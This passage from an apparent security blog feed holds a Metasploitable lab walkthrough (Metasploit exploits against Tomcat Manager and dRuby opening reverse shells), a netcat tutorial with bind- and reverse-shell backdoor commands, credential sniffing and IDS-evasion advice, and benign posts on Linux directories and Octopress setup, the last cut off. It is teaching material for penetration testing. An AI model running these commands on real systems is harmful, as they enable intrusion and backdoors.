</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   PASSWORD                   no        The password for the specified username
</span><span class='line'>   PATH      /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
</span><span class='line'>   Proxies                    no        Use a proxy chain
</span><span class='line'>   RHOST                      yes       The target address
</span><span class='line'>   RPORT     80               yes       The target port
</span><span class='line'>   USERNAME                   no        The username to authenticate as
</span><span class='line'>   VHOST                      no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set PASSWORD tomcat
</span><span class='line'>PASSWORD =&gt; tomcat
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set USERNAME tomcat
</span><span class='line'>USERNAME =&gt; tomcat
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set PASSWORD tomcat
</span><span class='line'>PASSWORD =&gt; tomcat
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set USERNAME tomcat
</span><span class='line'>USERNAME =&gt; tomcat
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set RPORT 8180
</span><span class='line'>RPORT =&gt; 8180
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set payload  java/meterpreter/reverse_tcp
</span><span class='line'>payload =&gt; java/meterpreter/reverse_tcp
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.127.159:8888 
</span><span class='line'>[*] Attempting to automatically select a target...
</span><span class='line'>[*] Automatically selected target "Linux x86"
</span><span class='line'>[*] Uploading 13833 bytes as RuoE02Uo7DeSsaVp7nmb79cq.war ...
</span><span class='line'>[*] Executing /RuoE02Uo7DeSsaVp7nmb79cq/19CS3RJj.jsp...
</span><span class='line'>[*] Undeploying RuoE02Uo7DeSsaVp7nmb79cq ...
</span><span class='line'>[*] Command shell session 4 opened (192.168.127.159:8888 -&gt; 192.168.127.154:33966) at 2014-06-06 23:51:01 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>tomcat55</span></code></pre></td></tr></table></div></figure>


<p>We can elevate our privileges using the udev exploit from earlier, so I won&rsquo;t go over it again.</p>

<h3>Port 8787 drb</h3>

<p>First I wanted to know what this drb is, since I wasn&rsquo;t familiar with it.</p>

<blockquote><p>Distributed Ruby or DRb allows Ruby programs to communicate with each other on the same machine or over a network. DRb uses remote method
invocation (RMI) to pass commands and data between processes (Wikipedia)</p></blockquote>

<p>Then I searched in Metasploit for an exploit, and luckily, I got a hit:</p>

<p><strong>Distributed Ruby Send instance_eval/syscall Code Execution</strong></p>

<blockquote><p>This module exploits remote code execution vulnerabilities in dRuby</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/linux/misc/drb_remote_codeexec
</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/linux/misc/drb_remote_codeexec):
</span><span class='line'>
</span><span class='line'>   Name  Current Setting  Required  Description
</span><span class='line'>   ----  ---------------  --------  -----------
</span><span class='line'>   URI                    yes       The dRuby URI of the target host (druby://host:port)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; set URI druby://192.168.127.154:8787
</span><span class='line'>URI =&gt; druby://192.168.127.154:8787
</span><span class='line'>
</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; set payload cmd/unix/reverse
</span><span class='line'>payload =&gt; cmd/unix/reverse
</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse double handler
</span><span class='line'>[*] trying to exploit instance_eval
</span><span class='line'>[*] instance eval failed, trying to exploit syscall
</span><span class='line'>[-] Exploit failed: Errno::EINVAL Invalid argument
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo 7Kx3j4QvoI7LOU5z;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "7Kx3j4QvoI7LOU5z\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Command shell session 1 opened (192.168.127.159:4444 -&gt; 192.168.127.154:35889) at 2014-06-08 16:51:56 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Another port, another shell!</p>

<p>This turned out to be a a very lengthy post. There were some ports I couldn&rsquo;t find an exploit for, so can&rsquo;t determine if the underlying services were exploitable or not. Overall, owning Metasploitable in multiple ways and documenting it was the goal of this post.</p>

<p>Today&rsquo;s cookie:</p>

<blockquote><p>You will be a winner today.  Pick a fight with a four-year-old.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Network tools - Netcat]]></title>
    <link href="http://chousensha.github.io/blog/2014/05/31/network-tools-netcat/"/>
    <updated>2014-05-31T00:20:29+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/05/31/network-tools-netcat</id>
    <content type="html"><![CDATA[<p>In this tutorial I will cover some of the uses of netcat, known as the &ldquo;TCP/IP Swiss army knife&rdquo;. Netcat is a very powerful and versatile tool that can be used in diagnosing network problems or in penetration testing.</p>

<!-- more -->


<p>There are many netcat variations, some are more recent and have been rewritten to include more features. Let&rsquo;s look at the original netcat man page:</p>

<blockquote><p>netcat is a simple unix utility which reads and writes data across net-
work connections, using TCP or UDP protocol. It is  designed  to  be  a
reliable  &ldquo;back-end&rdquo; tool that can be used directly or easily driven by
other programs and scripts.  At the same time,  it  is  a  feature-rich
network  debugging and exploration tool, since it can create almost any
kind of connection you would need and has several interesting  built-in
capabilities.</p></blockquote>

<p>Ok, so let&rsquo;s see some of the many ways we can use netcat.</p>

<h3>Banner grabbing</h3>

<p>First, let&rsquo;s see what we can glean from using netcat to connect to an FTP server:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc 192.168.127.130 21
</span><span class='line'>220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
</span><span class='line'>220-You are user number 1 of 50 allowed.
</span><span class='line'>220-Local time is now 17:23. Server port: 21.
</span><span class='line'>220-This is a private system - No anonymous login
</span><span class='line'>220-IPv6 connections are also welcome on this server.
</span><span class='line'>220 You will be disconnected after 15 minutes of inactivity.</span></code></pre></td></tr></table></div></figure>


<p>As you can see, there is some information available about the server, including the type of the FTP server, the number of logged in users and the maximum number allowed, the local time of the system, the fact that anonymous logins are disallowed, and that it&rsquo;s possible to connect via IPv6. Depending on the configuration of a server, the information disclosed could be pretty detailed, or sparse and misleading, as to not give away too much info to a potential attacker.</p>

<p>Now let&rsquo;s try banner grabbing from an HTTP server by sending a HEAD request:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc 192.168.127.130 80
</span><span class='line'>HEAD / HTTP/1.0
</span><span class='line'>
</span><span class='line'>HTTP/1.1 200 OK
</span><span class='line'>Date: Fri, 21 Feb 2014 17:51:58 GMT
</span><span class='line'>Server: Apache/2.2.14 (Ubuntu)
</span><span class='line'>Last-Modified: Tue, 10 May 2011 16:01:46 GMT
</span><span class='line'>ETag: "27bda-b1-4a2ee12abae80"
</span><span class='line'>Accept-Ranges: bytes
</span><span class='line'>Content-Length: 177
</span><span class='line'>Vary: Accept-Encoding
</span><span class='line'>Connection: close
</span><span class='line'>Content-Type: text/html</span></code></pre></td></tr></table></div></figure>


<p>This information can vary as well, this time the bit we&rsquo;re interested in is the server version and the operating system. Sometimes there is more to be discovered, like the PHP version that powers the server etc.</p>

<h3>Chat server</h3>

<p>Let&rsquo;s now look at how easy it is to use netcat for a very simple chat server.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 4444
</span><span class='line'>listening on [any] 4444 ...</span></code></pre></td></tr></table></div></figure>


<p>In the above command I told netcat to listen on port 4444. The -v flag is for more verbose output.</p>

<p>Now, from a different terminal window (or machine), connect to that port with netcat and start typing stuff. You will see the output being echoed in the server window. If you type stuff back from the server window, you will see it printed in the client window:</p>

<p><img class="center" src="http://chousensha.github.io/images/nc_chat.png" title="nc_chat" alt="chat"></p>

<h3>File transfer</h3>

<p>To transfer files between 2 machines, netcat can be used in the following way. On one computer, let&rsquo;s tell netcat to listen on a port and push a file to the socket:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 4444 &lt; confidential.txt
</span><span class='line'>listening on [any] 4444 ...</span></code></pre></td></tr></table></div></figure>


<p>Bascially, this takes the file and pushes it on the listening socket, ready to be pulled by a client that connects to that port. Now, from another computer, connect to the listener and redirect whatever you receive to a file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v 192.168.127.130 4444 &gt; transfer.txt
</span><span class='line'>192.168.127.130: inverse host lookup failed: Unknown server error : Connection timed out
</span><span class='line'>(UNKNOWN) [192.168.127.130] 4444 (?) open</span></code></pre></td></tr></table></div></figure>


<p>Now we can check that we have a new file named transfer.txt which has the same contents as the file that was offered by the server, confidential.txt. Note that netcat doesn&rsquo;t give any indication of the transfer progress or its completion.</p>

<h3>Port scanning</h3>

<p>Netcat can also be used as a very basic port scanner:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -n -z -w1 192.168.127.130 1-1000
</span><span class='line'>(UNKNOWN) [192.168.127.130] 80 (www) open
</span><span class='line'>(UNKNOWN) [192.168.127.130] 21 (ftp) open</span></code></pre></td></tr></table></div></figure>


<p>Here we scanned the range of ports between 1 and 1000 and we determined that ports 21 and 80 are open. The -n switch disables DNS lookup, the -z is for not sending any data, thus reducing the time it requires to talk to the ports. And the -w1 tells netcat to wait 1 second before determining that a connection occurred. This is a TCP only scan. For UDP, add the -u flag.</p>

<h3>Port forwarding</h3>

<p>Netcat&rsquo;s port forwarding ability could be useful in a variety of scenarios, from bypassing traffic restrictions in a secure environment to using a proxy (or more) to conduct a MITM attack.</p>

<p>For this example, I will be using the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Attacker machine: 192.168.127.133
</span><span class='line'>Relaying machine: 192.168.127.130
</span><span class='line'>Victim machine: 192.168.127.129</span></code></pre></td></tr></table></div></figure>


<p>On the relay, use the following command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -l -p 4444 -c "nc 192.168.127.129 22"</span></code></pre></td></tr></table></div></figure>


<p>This sets up a listener on port 4444. The -c flag specifies a shell command to be executed by the /bin/sh shell (if the system doesn&rsquo;t have such a shell, you can use the -e flag to execute a command or file instead. On a Windows machine, for instance, you could run cmd.exe or a batch file containing your desired commands). So, in the above, the proxy will forward connections it receives on port 4444 to the victim machine on port 22.</p>

<p>From the attacker machine, connect to the proxy:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc 192.168.127.130 4444
</span><span class='line'>SSH-2.0-OpenSSH_5.9</span></code></pre></td></tr></table></div></figure>


<p>Bingo! We can see that there is an SSH server waiting for someone to log in. On the victim machine, let&rsquo;s confirm that we have a connection:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netstat -antp | grep 22
</span><span class='line'>tcp        0      0 192.168.127.129:22      192.168.127.130:43583   ESTABLISHED -</span></code></pre></td></tr></table></div></figure>


<p>So the victim is unaware of the real source of the connection! It sees the connection as originating from the relay machine.</p>

<h3>Remote backdoor &ndash; Bind shell</h3>

<p>Once an attacker has exploited a victim machine, he may want to return afterwards and have a nice, cozy backdoor waiting for him. If there is a direct connection between the 2 machines, netcat can be used to bind a shell to a port and wait for the attacker to connect. The shell will have the privileges of the user who spawned it, so it&rsquo;s best to have administrative privileges for full power over the system.</p>

<p>On the machine you want to backdoor, use netcat to bind the shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 5555 -e /bin/bash</span></code></pre></td></tr></table></div></figure>


<p>Now from another machine, use netcat to connect to it on that port and your shell will be waiting for you. Keep in mind there won&rsquo;t be any prompt or anything like that. Just type commands in the terminal.</p>

<p><img class="center" src="http://chousensha.github.io/images/nc_bindshell.png" title="nc_bindshell" alt="Bind shell"></p>

<h3>Reverse shell</h3>

<p>The more common way to use netcat for backdooring is to spawn a reverse shell that connects back to the atacker. This is useful in case the victim is behind a NAT or in a protected internal network that can&rsquo;t be directly accessed from the internet.</p>

<p>So, let&rsquo;s get on with it and start a listener on the attacking machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -n -p 5555
</span><span class='line'>listening on [any] 5555 ...</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s connect from the victim machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -n 192.168.127.130 5555 -e /bin/bash
</span><span class='line'>(UNKNOWN) [192.168.127.130] 5555 (?) open</span></code></pre></td></tr></table></div></figure>


<p>Basically, the victim machine sent the attacker a shell, and now we control the victim again. I used the -n switch as well to disable all those pesky inverse lookups.</p>

<p><img class="center" src="http://chousensha.github.io/images/nc_reverse.png" title="nc_reverse" alt="reverse shell"></p>

<h3>Honeypot</h3>

<p>It is possible to set up a very simple honeypot using netcat. I grabbed the banner for the Pure-FTPd server and copied it to a file called banner.txt. Now start listening on port 21 and serve that banner for visitors:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vv -l -n -p 21 &lt; banner.txt | cat &gt; log.txt</span></code></pre></td></tr></table></div></figure>


<p>The additional -v flag is for extra verbosity and the data received is piped to a log file. Now, from another machine, let&rsquo;s connect to port 21 and see what we get:</p>

<p><img class="center" src="http://chousensha.github.io/images/nc_honeypot.png" title="nc_honeypot" alt="honeypot"></p>

<p>Here we&rsquo;re seeing the familiar FTP banner even though there&rsquo;s no real FTP server running. We send some random data and now let&rsquo;s check on the other machine that this data has been logged:</p>

<p><img class="center" src="http://chousensha.github.io/images/nc_log.png" title="nc_log" alt="Log output"></p>

<p>Of course, you might want netcat to keep on listening and not stop after every connection. Consider writing a script for that or look into versions that have continuous connection options.</p>

<h3>Sniffer</h3>

<p>Netcat can also be used to sniff traffic from a specific port. One machine has Pure-FTPd running on port 21. On the same machine, we&rsquo;ll use netcat to listen on some other port and execute a script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -l -p 4444 -n -vv -e /root/sniff
</span><span class='line'>listening on [any] 4444 ...</span></code></pre></td></tr></table></div></figure>


<p>The script file contains the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/bin/bash
</span><span class='line'>nc -o /root/log 192.168.127.130 21</span></code></pre></td></tr></table></div></figure>


<p>The -o flag is for hex dumping the traffic. This script tells netcat to hex dump the traffic that comes to port 21 and write it to the /root/log file. And on the command line I used netcat to listen on port 4444 and call this script. Now let&rsquo;s try connecting from another machine to the port that netcat listens on:</p>

<p><img class="center" src="http://chousensha.github.io/images/nc_ftp.png" title="nc_ftp" alt="FTP"></p>

<p>Since this is a test lab and I already knew about the FTP server being sniffed, I tried to log in directly.</p>

<p>Let&rsquo;s check what got logged on the other machine:</p>

<p><em>cat /root/log | more</em></p>

<p><img class="center" src="http://chousensha.github.io/images/nc_hex.png" title="nc_hexdump" alt="dump"></p>

<p>There we go! We have a file containing the traffic to port 21, and we can see the attempt to log in has failed with the given credentials. But when a legitimate user will log in, we will have the right username and password.</p>

<h3>Disk cloning</h3>

<p>Yes, you can even copy hard disks over the network with netcat, in conjunction with the <em>dd</em> program.</p>

<p>On the system that you want to copy from, run this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dd if=/dev/sda | nc 192.168.127.130 5555</span></code></pre></td></tr></table></div></figure>


<p>And on the machine you&rsquo;re copying to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -l -p 5555 | dd of=/dev/sda</span></code></pre></td></tr></table></div></figure>


<p>Be careful when performing operations on hard drives, best to test them on virtual machines first than realizing you just wiped your HDD.</p>

<p>I hope by now you realize how powerful netcat can be and its usefulness in a variety of scenarios. Of course, during a real penetration test or uhm, hack attempt, you will probably want to encrypt your traffic with cryptcat or something, since by now, all the IDS vendors are including signatures for netcat. Also, the examples were kept simple for ease of understanding, but in the real world netcat would be chained together with other tools to create complex and stealthy attacks.</p>

<blockquote><p>If more of us valued food and cheer and song above hoarded gold, it would
be a merrier world.
&mdash; J.R.R. Tolkien</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Touring the Linux directories]]></title>
    <link href="http://chousensha.github.io/blog/2014/05/28/touring-the-linux-directories/"/>
    <updated>2014-05-28T21:58:52+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/05/28/touring-the-linux-directories</id>
    <content type="html"><![CDATA[<p>The Linux directory tree can be a bit daunting, to say the least, for those coming from Windows backgrounds and accustomed to visiting only Documents and Program Files directories. So I thought about summarizing the important directories in the filesystem hierarchy. Here it goes.</p>

<!-- more -->


<p><strong>/</strong> This is the root directory, the starting point for the filesystem tree. This is not the same as the root user&rsquo;s home directory, which is /root. Only the root user has write privileges inside this directory.</p>

<p><strong>/boot</strong> Contains static files needed for booting. The boot loader, the initial RAM disk image and the Linux kernel are among the most important things you&rsquo;ll find here.</p>

<p><strong>/bin</strong> Binaries (executables) for the common utilities that are used by all users on the system (such as ls, grep, shells etc.) are located here. The programs stored here need to be available in single user mode.</p>

<p><strong>/dev</strong> Device files associated with physical hardware are found here. There are some virtual devices here that don&rsquo;t correspond to physical devices, like /dev/random, that creates random numbers, and the (in)famous black hole, /dev/null.</p>

<p><strong>/etc</strong> In here there are system-wide configuration files for all programs. Scripts for starting / stopping services are also found here. This is a very important directory, since the configuration of the entire system depends on it. That&rsquo;s why it should be backed up on a regular basis, to save all the configuration details in case something bad might happen that requires re-installation. The configuration files are text files that can be edited manually.</p>

<p><strong>/home</strong> The home directories for all users reside here. Every user keeps his data and user defined configuration files here. Users have supreme power and privileges inside their home directory.</p>

<p><strong>/lib</strong> Here you can find the shared libraries (the equivalents of Windows DLLs) required by the core system binaries. The /modules subdirectory contains kernel modules (drivers that can be loaded and unloaded as needed.</p>

<p><strong>/media</strong> Mount points for removable media, such as CDs, DVDs, USBs, are found in this directory.</p>

<p><strong>/mnt</strong> This is a generic mount point for mounting temporary filesystems.</p>

<p><strong>/opt</strong> This directory holds optional software packages and third party applications that aren&rsquo;t found in a default Linux installation, such as commercial software.</p>

<p><strong>/proc</strong> This is a pseudo filesystem that contains information about the system resources and running processes.</p>

<p><strong>/root</strong> This is the home directory for the root user.</p>

<p><strong>/sbin</strong> Here you can find system binaries that are used for system maintenance and administrative tasks, like ifconfig, fdisk etc.</p>

<p><strong>/tmp</strong> In here you can find temporary files that are normally deleted when the system restarts. Applications may store here some files needed for their operation, that can get deleted on the fly by utilities such as cron jobs when they are no longer required.</p>

<p><strong>/lost+found</strong> In case of a system crash, the system will do a filesystem check at the next boot, attempting to recover files that got corrupted during the crash. These files will be placed here. Note that there is a high change the files aren&rsquo;t completely recovered.</p>

<p><strong>/usr</strong> Non critical user binaries are placed here, along with their documentation and libraries. This is the largest directory on a Linux system. In the /usr/local directory you can find locally compiled software. The /usr/src directory holds kernel source files and headers.</p>

<p><strong>/var</strong> This directory holds variable files that are expected to grow in size. Various types of files can be found here, such as log files, databases, mail, print queues, lock files and other runtime files.</p>

<p><strong>/srv</strong> Contains data for services provided by servers.</p>

<p>And the cookie:</p>

<blockquote><p>Try to have as good a life as you can under the circumstances.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Setting up Octopress]]></title>
    <link href="http://chousensha.github.io/blog/2014/05/27/setting-up-octopress/"/>
    <updated>2014-05-27T21:44:43+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/05/27/setting-up-octopress</id>
    <content type="html"><![CDATA[<p>Since I now got the blog up and running, I want to walk through the steps of setting it up and where I had to do some extra work not mentioned in the official documentation, which by the way, is a good place to start reading about Octopress.</p>

<!-- more -->


<p>First, I want to mention that starting an Octopress blog is not a daunting task at all. You don&rsquo;t need to know Ruby, the main commands for getting it to work are already implemented for you. The files you need to modify are intuitive and structured in a logical way, and the <code>markdown</code> language is easy to use even if you never heard of it before ( I certainly hadn&rsquo;t before starting with Octopress ). Some basic familiarity with a command shell and Git is all that&rsquo;s really needed! So if you want the awesome looks and other perks of Octopress, it&rsquo;s not hard at all to get them!</p>

<p>So, Octopress is built on top of Jekyll, which is a simple, blog-aware, static site generator based on Ruby. Jekyll is actually the engine behind GitHub Pages. Being static, it&rsquo;s very fast and no myriad features that you don&rsquo;t really need are cluttering up the server side. And Octopress gives you the necessary tools to customize and maintain a blog in a flexible and convenient way. It also comes loaded with plugins for many 3rd party services that you might want to use.</p>

<h3>Installation</h3>

<p>You need to have Git and Ruby 1.9.3 or greater before installing Octopress. You can check your Ruby version with this command: <code>ruby &mdash;version</code></p>

<p>To start with, clone the Octopress repository and give it the name you want:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git clone git://github.com/imathis/octopress.git blogname</span></code></pre></td></tr></table></div></figure>


<p>Then, install dependencies. I had to install the <code>ruby1.9.1-dev</code> package before the <em>bundle install</em> would work.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gem install bundler
</span><span class='line'>bundle install</span></code></pre></td></tr></table></div></figure>


<p>Next, install the default Octopress theme:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rake install</span></code></pre></td></tr></table></div></figure>


<h3>Configuration</h3>

<p>To configure your blog, you need to edit the <code>_config.yml</code> file. There you can add your blog URL, description categories, 3rd party integration, and other stuff.</p>

<h3>Content</h3>

<p>To create a post, you run the following rake task:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rake new_post["title"]</span></code></pre></td></tr></table></div></figure>


<p>This will create a <code>markdown</code> post in the <code>source/_posts</code> directory. Use your favorite text editor to edit it and add your post body. Markdown is really easy to use, just look at one of reference sheets available on the web to get started with it.</p>

<p>Similarly, if you want to create a new page, you do it like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rake new_page[page]</span></code></pre></td></tr></table></div></figure>


<p>To see how your posts look:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rake preview</span></code></pre></td></tr></table></div></figure>


<p>This will start a small server on port 4000 that will let you view your pages on your local machine. Check it out in your browser by navigating to <code><a href="http://localhost:4000/">http://localhost:4000/</a></code></p>

<h3>Deployment</h3>

<p>To generate your blog (populate the public directory with your posts and pages) run:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rake generate</span></code></pre></td></tr></table></div></figure>


<p>Now you are ready to deploy it. I use Github Pages for the blog. If you want it hosted on Github, there&rsquo;s a rake task available for it, but first you need to create a new repository that should look like this: <code>username.github.io</code></p>

<p>Then run:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rake setup_github_pages</span></code></pre></td></tr></table></div></figure>


<p>You will be asked for the URL of your newly created repository, which you can copy from the HTTPS or SSH URL available on its page.</p>

<p>After that&rsquo;s done, you can deploy your generated files with:</p>

